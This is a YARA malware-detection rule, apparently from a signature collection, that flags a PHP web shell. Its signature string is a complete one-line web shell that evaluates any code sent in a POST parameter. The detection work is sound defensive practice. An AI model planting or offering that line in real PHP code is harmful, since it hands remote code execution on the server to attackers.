rule webshell_webshells_new_xxxx {
  meta:
    author = "Spider"
    comment = "None"
    date = "2014/03/28"
    description = "Web shells - generated from file xxxx.php"
    family = "None"
    hacker = "None"
    hash = "5bcba70b2137375225d8eedcde2c0ebb"
    judge = "black"
    license = "https://creativecommons.org/licenses/by-nc/4.0/"
    reference = "None"
    score = 70
    threatname = "None"
    threattype = "None"
  strings:
    $s0 = "<?php eval($_POST[1]);?>  " fullword
  condition:
    all of them
}